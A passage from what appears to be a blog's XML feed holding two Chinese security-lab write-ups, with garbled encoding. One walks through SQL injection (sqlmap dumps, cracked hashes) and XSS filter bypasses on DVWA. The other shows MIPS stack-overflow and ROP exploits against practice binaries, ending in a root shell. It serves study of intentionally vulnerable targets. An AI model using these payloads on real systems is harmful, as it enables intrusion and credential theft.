5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1 AND SLEEP(5)&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit æŒ‡å®šæ•°æ®åº“çˆ†è¡¨ python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa --tables å¾—åˆ°ï¼š 123456Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ æŒ‡å®šè¡¨çˆ†å­—æ®µ python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ æŒ‡å®šè¡¨ç„¶åŽdumpæ•°æ® python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --dump-all sqlmapå¾ˆæœºæ™ºçš„åœ¨ç ´è§£md5 123[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; å¾—åˆ°çš„è¡¨ 12345678910| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://192.168.41.161/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2019-07-15 13:57:22 | 0 || 2 | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2019-07-15 13:57:22 | 0 || 3 | http://192.168.41.161/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2019-07-15 13:57:22 | 0 || 4 | http://192.168.41.161/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2019-07-15 13:57:22 | 0 || 5 | http://192.168.41.161/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2019-07-15 13:57:22 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ sqlmap tql tql tql high è¿™æ—¶å€™å°±å¾ˆã€‚ã€‚ ä¼šå¼¹å‡ºä¸€ä¸ªé¡µé¢ï¼Œè¾“å…¥æ•°æ®ä¹‹åŽå†è·³å›žæ¥ è¿™å°±å¾ˆå®‰å…¨äº†ðŸ˜› ä½†æ˜¯ã€‚ã€‚ æŸ¥çœ‹æºç ä¹‹åŽå‘çŽ°ï¼š å…¶å®žæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼› 123// Check database$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); æ‰€ä»¥payloadç…§æ ·ç”¨ï¼Œæ²¡é—®é¢˜ impossible è¿™æ¬¡å°±æ›´ä¸ä¸€èˆ¬äº† 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; è¿™é‡Œç”¨åˆ°äº†PDOé¢„ç¼–è¯‘çš„æ–¹å¼ é‚£å¯èƒ½å°±çœŸçš„æ²¡åŠžæ³•äº† çœ‹äº†ä¸‹stackoverflow How can I prevent SQL injection in PHP? Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ï¼š 1234567$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));foreach ($stmt as $row) &#123; // Do something with $row&#125; æˆ–è€…å¯¹äºŽmysqlæ¥è¯´ï¼Œå¯ä»¥ï¼š 123456789$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;$stmt-&gt;execute();$result = $stmt-&gt;get_result();while ($row = $result-&gt;fetch_assoc()) &#123; // Do something with $row&#125; PDOçœŸçš„æ˜¯å®‰å…¨çš„å—ï¼Ÿ Are PDO prepared statements sufficient to prevent SQL injection? SQL injection that gets around mysql_real_escape_string() XSS reflected ç¬¬ä¸€éåœ¨chromeä¸Šè¯•äº†ä¸‹&lt;script&gt;alert(1)&lt;/script&gt;æ²¡æˆåŠŸ ä½†æ˜¯çœ‹æºç ï¼š å¯èƒ½æ˜¯chromeå¤ªå®‰å…¨äº†å§ æ¢æˆfirefoxå°±æ²¡äº‹äº† medium å¦‚æžœçœ‹æºç å°±ä¼šå‘çŽ°åªæ˜¯ç®€å•åœ°å¯¹scriptè¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤ $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); é‚£ä¹ˆå¦‚ä½•ç»•è¿‡è¿™ä¸ªé™åˆ¶å‘¢ é‚£å°±è¿™æ ·æž„é€  &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; å°±èƒ½ç»•è¿‡è¿‡æ»¤äº†ï¼Œä¸»è¦é—®é¢˜è¿˜æ˜¯è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œä¹‹è¿‡æ»¤äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥åŒå†™å°±èƒ½å¾ˆå®¹æ˜“åœ°ç»•è¿‡äº† ps. å¤§å°å†™ä¹Ÿå¯ä»¥ high è¿™æ¬¡è¿‡æ»¤æ›´ä¸¥æ ¼äº† $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); æœ€åŽåªç•™äº†ä¸€ä¸ª&gt;ç»™ä½  æžœç„¶æˆ‘è®°å¾—è¿˜æœ‰imgæ ‡ç­¾ä¹Ÿå¯ä»¥é€ æˆxssæ¥ç€ &lt;img src=&quot;aa&quot; onError=alert(123) &gt; è¿™æ ·å°±è¡Œå•¦ï¼Œå½“ç„¶chromeå¤ªå®‰å…¨äº†ï¼Œè¿˜æ˜¯ç”¨firefoxå§ impossible 1234567checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end user$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; è¿™ç§æƒ…å†µä¸‹è¿˜è¿›è¡Œäº†å®žä½“ç¼–ç ï¼Œçœ‹ä½ æ€Žä¹ˆç»•è¿‡ é‚£äº›å¹´æˆ‘ä»¬æ²¡èƒ½bypassçš„xss filter ä¸€ç¯‡æ€»ç»“äº†xssçš„æ–‡ç«  sql ç›²æ³¨ ä»Žlowå¼€å§‹çœ‹èµ·ï¼Œ ç›´æŽ¥æŠ“åŒ…ç„¶åŽå°†æ•°æ®åŒ…ä¿å­˜èµ·æ¥ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹å°±å°±å‡ºæ¥äº†ï¼Œ-rå‚æ•°æ˜¯è¯»å–ä¸€ä¸ªæ•°æ®åŒ…ä¸­çš„æ–‡ä»¶ï¼Œç„¶åŽsqlmapä¼šè‡ªåŠ¨è§£æžå®ƒ mediume ä¸€æ ·çš„ï¼Œåªæ˜¯æ•°æ®åŒ…å˜æˆäº†postæ–¹å¼æäº¤çš„ high è¿™æ¬¡sqlmapæŠ½é£Žæ²¡è·‘å‡ºæ¥ çœ‹ä¸‹æºç å¥½äº† æœ¬æ¥ç›²æ³¨å°±æ˜¯è¦é€šè¿‡è„šæœ¬æ¥è·‘çš„ï¼Œä½†æ˜¯æˆ‘æ¯”è¾ƒæ‡’emmmï¼Œè¿˜æ˜¯è¦å¤ä¹ ä¸€ä¸‹å¦‚ä½•ç”¨pythonè„šæœ¬è·‘å‡ºæ¥ å¦‚ä½•ç›²æ³¨ï¼Ÿ ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£ SQL ç›²æ³¨ ç›²æ³¨æœ€å¸¸è§çš„ä¸€ä¸ªpayload 127.0.0.1/sqllib/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80â€“+ åˆ¤æ–­æ•°æ®åº“ä¸­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå¦ä¸º'P' xss å­˜å‚¨åž‹ è¿˜æ˜¯æœ€ç®€å•çš„low è¡¨å•ä¸Šçš„nameæœ‰é•¿åº¦é™åˆ¶ï¼Œä¸è¿‡è¿™åªæ˜¯å‰ç«¯çš„é™åˆ¶è€Œå·² &lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt; æ³¨å…¥æˆåŠŸ medium è¿™å°±å¾ˆå°´å°¬äº†ã€‚ã€‚ åŽŸæ¥è¿™å°±æ˜¯å­˜å‚¨åž‹xssçš„åŽ‰å®³äº†ï¼Œç›´æŽ¥å­˜è¿›åŽ»äº†ï¼Œæ‰€ä»¥æˆ‘æ‰“å¼€mediumçš„é¡µé¢æ—¶ï¼Œè¿žç€å¼¹å‡ºäº†ä¸¤ä¸ªæ¡†æ¡†ï¼ŒäºŽæ˜¯æƒ³çœ‹ä¸€ä¸‹å®ƒçš„æºç ï¼š è¿™é‡Œä¹Ÿæ˜¯é€šè¿‡å¤§å°å†™æˆ–è€…åŒå†™å°±èƒ½ç»•è¿‡çš„ &lt;sCriPt&gt;alert(1)&lt;/script&gt; æ‰¾åˆ°äº†ä¸€ä¸ªxsså¹³å° xsså¹³å° ä½†æ˜¯æˆ‘å‘çŽ°æˆ‘ä¸ä¼šç”¨äº†ã€‚ã€‚]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT æ ˆæº¢å‡ºç¬”è®°]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MIPSæ ˆæº¢å‡º x86å’ŒMIPSæŒ‡ä»¤é›† åœ¨æˆ‘çš„ç†è§£çœ‹æ¥ï¼Œx86å¯¹äºŽæ ˆçš„æ“ä½œå¤šäº†pushå’Œpopæ“ä½œï¼Œè€ŒMIPSæŒ‡ä»¤é›†å¹¶æ²¡æœ‰è¿™äº›ï¼ŒåŒæ—¶ä¸¤è€…ä¸€ä¸ªæ˜¯å°ç«¯åºï¼Œä¸€ä¸ªæ˜¯å¤§ç«¯åºï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåœ¨è°ƒè¯•ç¨‹åºçš„æ—¶å€™ä¾æ—§ç”¨çš„æ˜¯å°ç«¯åºemmmm MISPæŒ‡ä»¤é›†å­˜åœ¨æ ˆæº¢å‡ºçš„åŽŸå›  å¶å­å‡½æ•°å’Œéžå¶å­å‡½æ•° å¶å­å‡½æ•°çš„è¿”å›žåœ°å€æ˜¯ç›´æŽ¥æ”¾åœ¨ ra å¯„å­˜å™¨ä¸­ï¼Œè€Œéžå¶å­å‡½æ•°éœ€è¦è°ƒç”¨å¦å¤–çš„å‡½æ•°ï¼Œè¿™é‡Œçš„å·®å¼‚å°±ç…§æˆäº†éžå¶å­å‡½æ•°éœ€è¦æŠŠå½“å‰çš„è¿”å›žåœ°å€æš‚æ—¶å­˜æ”¾åœ¨æ ˆä¸Š å®žéªŒçŽ¯å¢ƒ attifyOSè™šæ‹Ÿæœºï¼ŒåŸºæœ¬å†…ç½®äº†æˆ‘éœ€è¦çš„æ‰€æœ‰å·¥å…·ï¼Œå½“ç„¶å…¶ä¸­çš„IDAä¼¼ä¹Žè¿‡æœŸäº†ï¼ŒåŽ»å¾çˆ±ç ´è§£ä¸Šæ‰¾äº†ä¸€ä¸ªLinuxç‰ˆæœ¬çš„IDAå®‰è£…äº† å¾çˆ±ç ´è§£é“¾æŽ¥ MIPSåŠ¨æ€è°ƒè¯• ä½¿ç”¨qemu-mipselæˆ–è€…qemu-mipsel-staticè¿›è¡Œè°ƒè¯•ï¼Œqemuæ”¯æŒä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œ-gé€‰é¡¹å¼€å¯ä¸€ä¸ªç«¯å£ï¼ŒIDAå¯ä»¥è¿žæŽ¥ä¸Šè¿™ä¸ªç«¯å£ä»Žè€Œè¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚ä¹‹å‰åœ¨çœ‹é›ªçš„è™šæ‹Ÿæœºä¸Šåªèƒ½ç”¨qemu-mipsel-staticè°ƒè¯•ï¼ŒåŽæ¥æ¢æˆäº†attifyOSå‘çŽ°ä¸¤è€…éƒ½è¡Œã€‚ä¸è¿‡å¦‚æžœç¼ºå°‘åŠ¨æ€é“¾æŽ¥åº“çš„è¯è¿˜æ˜¯éœ€è¦chrootåŒæ—¶å°†ç›¸åº”çš„åº“æ‹·è´è¿‡æ¥ã€‚ ç®€å•çš„æ ˆæº¢å‡º æºç ï¼š 123456789101112131415#include &lt;stdio.h&gt;void vuln()&#123; system(&quot;/bin/sh&quot;);&#125;void has_stack(char *src)&#123; char dst[20] = &#123;0&#125;; strcpy(dst,src); printf(&quot;copy success!n&quot;);&#125;void main(int argc,char *argv[])&#123; has_stack(argv[1]);&#125; ä½¿ç”¨mipsel-linux-gccè¿›è¡Œç¼–è¯‘ mipsel-linux-gcc ./stack01.c -o stack01 -static ç¼–è¯‘ä¹‹åŽå¾—åˆ°ï¼š root@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped ä½¿ç”¨IDAæŸ¥çœ‹åæ±‡ç¼–ï¼š ç”±äºŽmainå‡½æ•°ä¸­è°ƒç”¨äº†å…¶ä»–çš„å‡½æ•°ï¼Œæ‰€ä»¥mainå‡½æ•°å¿…ç„¶æ˜¯éžå¶å­å‡½æ•°ï¼Œå½“ç„¶è¿™é‡Œæˆ‘ä»¬ä¸æ˜¯è¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ï¼Œå› ä¸ºhas_stackå‡½æ•°ä¹Ÿæ˜¯éžå¶å­å‡½æ•°ï¼Œè€Œä¸”strcpyæ²¡æœ‰å¯¹é•¿åº¦åšé™åˆ¶ã€‚ strcpyçš„ç¬¬ä¸€ä¸ªå‚æ•°dstå­˜æ”¾åœ¨$a0ä¸­ï¼Œç¬¬äºŒä¸ªå‚æ•°srcå­˜æ”¾åœ¨$a1ä¸­ï¼Œ 123456789.text:00400410 sw $zero, 0x38+var_10($fp).text:00400414 addiu $v0, $fp, 0x38+var_20 #è¦æ‹·è´åˆ°çš„åœ°æ–¹.text:00400418 move $a0, $v0.text:0040041C lw $a1, 0x38+arg_0($fp) # è¦æ‹·è´çš„å†…å®¹.text:00400420 la $v0, strcpy.text:00400424 move $t9, $v0.text:00400428 jalr $t9 ; strcpy.text:0040042C nop.text:00400430 lw $gp, 0x38+var_28($fp) å·æ‡’ä¸€ç‚¹ä¸ä»”ç»†åˆ†æžæ ˆäº† ä½¿ç”¨patternLocOffset.pyå·¥å…·ç”Ÿæˆé•¿åº¦ä¸º30çš„å­—ç¬¦ä¸² 12345/home/oit [oit@ubuntu] [4:31]&gt; python patternOffset.py -c -l 30[*] Create pattern string contains 30 characters ok![+] output to patternShell.txt ok![+] take time: 0.0004 s åŠ¨æ€è°ƒè¯•ï¼š ./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9 ç›´æŽ¥åœ¨è°ƒç”¨å‡½æ•°è¿”å›žçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ­¤æ—¶çš„$raå¯„å­˜å™¨çš„å€¼ 12345.text:00400450 move $sp, $fp.text:00400454 lw $ra, 0x38+var_4($sp).text:00400458 lw $fp, 0x38+var_8($sp).text:0040045C addiu $sp, 0x38.text:00400460 jr $ra (æ–­ç‚¹) è®¡ç®—éœ€è¦paddingçš„é•¿åº¦ 12345&gt; python patternOffset.py -s 0x62413961 -l 30[*] Create pattern string contains 30 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 28 (adjusted another-endian)[+] take time: 0.0008 s éœ€è¦å¡«å……28ä¸ªå­—èŠ‚ æœ€åŽçš„payload ./qemu-mipsel-static -g 1234 ./stack01 `python -c &quot;print 'a'*28+'\x90\x03\x40\x00'&quot;` æ­¤æ—¶æˆåŠŸåœ°å‘ç”Ÿäº†è·³è½¬ 12345root@ubuntu:~/stack# ./qemu-mipsel-static ./stack01 `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# lscore qemu-mipsel-static stack01 stack01.id0 stack01.idb stack01.tilqemu-mipsel ret2txt.c stack01.c stack01.id1 stack01.nam# whoamiroot ROP chain 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat(&quot;passwd&quot;,&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL) &#123; printf(&quot;Cannot open file passwd!n&quot;); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = &apos;x00&apos;; if(!strcmp(buf,&quot;adminpwd&quot;)) &#123; do_system_0(count,&quot;ls -l&quot;); &#125; else &#123; printf(&quot;you have an invalid password!n&quot;); &#125; fclose(fp);&#125; æ­¤å¤„mainå‡½æ•°æ˜Žæ˜¾æ˜¯éžå¶å­å‡½æ•°ï¼Œæˆ‘ä»¬è¦æƒ³åŠžæ³•è°ƒç”¨do_system_0è¿™ä¸ªå‡½æ•° é‚£å°±è¦æƒ³åŠžæ³•æŽ§åˆ¶$a1å¯„å­˜å™¨ï¼Œé‚£æ ·å°±å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ mipsrop.stackfinder() æŸ¥æ‰¾gadget æˆ‘ä»¬é€‰æ‹© 0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) è¦åšåˆ°è·³è½¬åˆ°æˆ‘ä»¬çš„gadgetï¼Œéœ€è¦è¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ å…ˆè®¡ç®—è¦paddingçš„é•¿åº¦ æ­¤æ—¶è®¡ç®—å‡ºæ¥çš„patternæ˜¯412ï¼Œä¼šä¸ä¼šå¤ªé•¿äº†ç‚¹(æ³¨ï¼šåœ¨æˆ‘å‚è€ƒçš„æ–‡ç« ä¸­ä½œè€…è®¡ç®—å‡ºæ¥çš„åç§»å’Œæˆ‘çš„ä¸ä¸€æ ·ï¼Œåˆšå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯è‡ªå·±è®¡ç®—é”™äº†ï¼Œä½†æ˜¯åŽæ¥è°ƒè¯•åŽè®¤ä¸ºè‡ªå·±å¹¶æ²¡æœ‰ç®—é”™) æŽ¥ä¸‹æ¥æˆ‘å°è¯•å…ˆè¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ è·³è½¬åˆ°ropçš„ç©ºé—´ï¼Œå†å°†/bin/shå­—ç¬¦ä¸²çš„åœ°å€èµ‹å€¼ç»™$a1 $raè¢«è¦†ç›– f7å•æ­¥ä¸€æ¬¡ï¼Œè·³è½¬åˆ°gadget è€Œä¸”æ­¤æ—¶æ ˆç©ºé—´å·²ç»å¸ƒç½®å¥½äº† addiu $a1, $sp, 0x58+var_40ç›¸å½“äºŽ $a1 = $sp+0x18 æ­¤æ—¶$sp+0x18å­˜æ”¾çš„å°±æ˜¯/bin/shå­—ç¬¦ä¸²çš„åœ°å€ ç„¶è€Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ è¿™ä¸ªé”™è¯¯å°±å¾ˆä¸æ˜Žä¸ç™½äº† é‡æ–°å›žé¡¾äº†ä¸€ä¸‹ã€Šæ­ç§˜å®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´žæŒ–æŽ˜æŠ€æœ¯ã€‹ï¼Œçœ‹åˆ°äº†ä½œè€…å†™çš„ä¸€ä¸ªexp å°†gadgetçš„åœ°å€æ›¿æ¢æˆæˆ‘çš„ï¼Œå¦‚ä¸‹ï¼š 12345678910111213141516171819202122import structcmd = &quot;sh&quot;cmd += &quot;\x00&quot;*(4-len(cmd)%4)shellcode = &quot;A&quot;*0x19cshellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadgetåœ°å€ï¼Œä½œè€…å†™çš„æ˜¯&quot;&lt;L&quot;ä½†æ˜¯æˆ‘å°è¯•ä¹‹åŽå‘çŽ°åœ°å€æ˜¯åçš„ï¼Œæ‰€ä»¥æ¢è¿‡æ¥äº†shellcode+=&quot;A&quot;*24shellcode+=cmdshellcode+=&quot;B&quot;*(0x3C-len(cmd))shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0å‡½æ•°åœ°å€shellcode+=&quot;BBBB&quot;print &quot;ok&quot;print &quot;[+] create password file&quot;fw = open(&apos;passwd&apos;, &apos;w&apos;)fw.write(shellcode)fw.close()print &apos;ok&apos; ç”Ÿæˆpasswdæ–‡ä»¶ä¹‹åŽï¼Œ./qemu-mipsel-static -g 1234 ./vuln_systemè¿›è¡Œè°ƒè¯• å½“ç¨‹åºè·³è½¬åˆ°gadgetæ—¶ï¼Œå˜æˆäº†è¿™æ ·ï¼Œ æ­¤æ—¶çœ‹ç»ˆç«¯ï¼š æˆ‘å±…ç„¶æˆåŠŸäº†ï¼Ÿï¼Ÿæ­¤æ—¶å·²ç»æ‹¿åˆ°äº†rootæƒé™ ç¡®å®žæ²¡æœ‰çœ‹é”™ï¼Œé‡æ–°è¿è¡Œä¸€éç¨‹åºï¼Œç¡®å®žæ‹¿åˆ°äº†shellæƒé™ DVRF ç»ƒä¹  è¿™ä¸ªåœ¨attifyOSä¸Šå·²ç»ä¸‹è½½å¥½äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŽ»GitHubä¸Šcloneä¸€ä»½ï¼Œä¸€ä¸ªå¾ˆä¸é”™çš„é¡¹ç›® æ¥çœ‹Introçš„stack_bof_01 ç¨‹åºä½äºŽ/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/ æºç ä½äºŽ/home/oit/DVRF/Pwnable Source/Intro 1234567891011121314151617181920212223242526272829303132#include &lt;string.h&gt;#include &lt;stdio.h&gt;//Simple BoF by b1ack0wl for E1550int main(int argc, char **argv[])&#123;char buf[200] =&quot;\0&quot;;if (argc &lt; 2)&#123;printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);exit(1);&#125;printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);strcpy(buf, argv[1]);printf(&quot;You entered %s \r\n&quot;, buf);printf(&quot;Try Again\r\n&quot;);return 0x41; // Just so you can see what register is populated for return statements&#125;void dat_shell()&#123;printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);system(&quot;/bin/sh -c&quot;);//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);//execve(&quot;/bin/sh&quot;, 0, 0);exit(0);&#125; æ˜¾ç„¶ä¹Ÿæ˜¯strcpyå‡½æ•°æ²¡æœ‰é™åˆ¶æ‹·è´çš„é•¿åº¦ è¿è¡Œå®ƒï¼š 123root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01Usage: stack_bof_01 &lt;argument&gt;-By b1ack0wl æˆ‘ä»¬ç›´æŽ¥è®¡ç®—åç§»åœ°å€ ç”Ÿæˆé•¿åº¦ä¸º200çš„å­—ç¬¦ä¸² 123456/home/oit [oit@ubuntu] [5:50]&gt; python patternOffset.py -s 0x41386741 -l 200[*] Create pattern string contains 200 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 204 (adjusted another-endian)[+] take time: 0.0042 s é‚£æˆ‘ä»¬è¯•ä¸€è¯•ç›´æŽ¥å¡«å…… 12root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; testroot@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot; æ­¤æ—¶å·²ç»å°†$raå¯„å­˜å™¨çš„å€¼è¦†ç›–æŽ‰äº† ä½†æ˜¯ åœ¨dat_shellå‡½æ•°ä¸­ æŠ¥é”™äº† æ‰€ä»¥è¿™æ—¶å€™éœ€è¦å€ŸåŠ©gadget ä¹‹å‰å‚è€ƒäº†å‡ ç¯‡æ–‡ç« ï¼Œéƒ½æ˜¯é€šè¿‡æŸ¥æ‰¾libcçš„åŸºåœ°å€æ¥ç¡®è®¤gadgetåœ¨å†…å­˜ä¸­çš„åœ°å€çš„ï¼Œä½†æ˜¯æˆ‘å¼€å§‹è¦gdbè°ƒè¯•çš„æ—¶å€™å¹¶æ²¡æœ‰çœ‹åˆ°libc.so.0çš„åŠ è½½ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´æ€€ç–‘æ˜¯ä¸æ˜¯æ²¡åŠ è½½ï¼Œç„¶åŽç„¶åŽï¼Œçœ‹åˆ°åŽŸç¨‹åºä¸­æ˜¯æœ‰putså’Œmemsetè¿™äº›å‡½æ•°çš„ï¼Œé‚£æ˜¾ç„¶æ˜¯åŠ è½½äº†çš„ äºŽæ˜¯ä¸‹ä¸€ä¸ªæ–­ç‚¹ç„¶åŽè°ƒè¯• ç»ˆäºŽæ‰¾åˆ°äº†libcçš„åŠ è½½åŸºå€ è¿™æ ·å°±å¥½åŠžäº† python -c &quot;print 'a'*204+'\x20\x1b\x8a\x40'+'\x50\x09\x40\x00'&quot; &gt; test ä¹‹åŽè¿è¡Œ okå·²ç»æˆåŠŸäº†ï¼ï¼ï¼ 1234567root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;Welcome to the first BoF exercise!You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ï¿½@P @Try AgainCongrats! I will now execute /bin/sh- b1ack0wl ä¸è¿‡ä¸ºå•¥ç”¨mipsropæ‰¾ä¸åˆ°è¿™ä¸ªgadgetå‘¢ï¼Ÿ 